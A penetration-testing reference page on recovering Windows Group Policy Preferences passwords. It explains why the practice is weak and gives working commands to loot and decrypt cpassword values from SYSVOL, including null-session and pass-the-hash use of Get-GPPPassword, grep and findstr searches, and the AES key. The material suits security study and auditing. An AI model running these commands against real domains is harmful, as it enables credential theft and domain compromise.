## Theory
Windows systems come with a built-in Administrator (with an RID of 500) that most organizations want to change the password of. This can be achieved in multiple ways but there is one that is to be avoided: setting the built-in Administrator's password through Group Policies.

- Issue 1: the password is set to be the same for every (set of) machine(s) the Group Policy applies to. If the attacker finds the admin's hash or password, he can gain administrative access to all (or set of) machines.
- Issue 2: by default, knowing the built-in Administrator's hash (RID 500) allows for powerful Pass-the-Hash attacks.
- Issue 3: all Group Policies are stored in the Domain Controllers' SYSVOL share. All domain users have read access to it. This means all domain users can read the encrypted password set in Group Policy Preferences, and since Microsoft published the encryption key around 2012, the password can be decrypted.
## Exploit GPP
=== "UNIX-like"
    From UNIX-like systems, the Get-GPPPassword.py (Python) script in the impacket examples can be used to remotely parse .xml files and loot for passwords.
    ```bash
    # with a NULL session
    Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'

    # with cleartext credentials
    Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'

    # pass-the-hash
    Get-GPPPassword.py -hashes 'LMhash':'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
    ```
    Searching for passwords can be done manually (or with Metasploit's `smb_enum_gpp` module), however it requires mounting the SYSVOL share, which can't be done through a docker environment unless it's run with privileged rights.

    Tools like [pypykatz](https://github.com/skelsec/pypykatz) (Python) and [gpp-decrypt](https://www.kali.org/tools/gpp-decrypt/) (Ruby) can then be used to decrypt the matches.
    ```bash
    # create the target directory for the mount
    sudo mkdir /tmp/sysvol

    # mount the SYSVOL share
    sudo mount\
    -o domain='domain.local'\
    -o username='someuser'\
    -o password='password'\
    -t cifs\
    '//domain_controller/SYSVOL'\
    /tmp/sysvol

    # recursively look for "cpassword" in Group Policies
    sudo grep -ria cpassword /tmp/sysvol/'domain.local'/Policies/ 2>/dev/null

    # decrypt the string and recover the password
    pypykatz gppass j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
    gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
    ```
=== "Windows"
    PowerSploit's [Get-GPPPassword](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1) searches a Domain Controller's SYSVOL share `Groups.xml, Services.xml, Scheduledtasks.xml, DataSources.xml, Printers.xml and Drives.xml` files and returns plaintext passwords
    ```bash
    Import-Module .\Get-GPPPassword.ps1
    Get-GPPPassword
    ```
    This can also be achieved without tools, by "manually" looking for the cpassword string in xml files and by then manually decrypting the matches.
    ```bash
    findstr /S cpassword %logonserver%\sysvol*.xml
    ```
    Decode process
    ```bash
    1. decode from base64
    2. decrypt from AES-256-CBC the following hex key/iv
    Key : 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b
    IV : 0000000000000000000000000000000
    3. decode from UTF-16LE
    ```